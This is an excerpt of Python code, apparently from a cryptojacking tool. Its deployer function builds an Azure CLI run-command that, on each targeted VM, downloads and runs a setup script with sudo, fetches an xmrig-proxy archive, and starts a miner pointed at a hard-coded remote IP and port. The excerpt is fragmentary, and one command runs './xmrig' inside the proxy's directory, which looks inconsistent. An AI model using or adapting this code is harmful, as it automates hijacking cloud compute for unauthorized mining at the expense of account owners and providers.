...
def deployer(x):
            ...
            runC='az vm run-command invoke -g '+str(x)+' -n '+str(x)+' --command-id RunShellScript --scripts "wget https://raw.githubusercontent.com/xmrig/xmrig/dev/scripts/enable_1gb_pages.sh && sudo sh enable_1gb_pages.sh && wget https://github.com/xmrig/xmrig-proxy/releases/download/v6.18.0/xmrig-proxy-6.18.0-linux-x64.tar.gz && tar -xvzf xmrig-proxy-6.18.0-linux-x64.tar.gz && cd xmrig-proxy-6.18.0 && sudo ./xmrig -o 20.169.8.123:3333" ' 
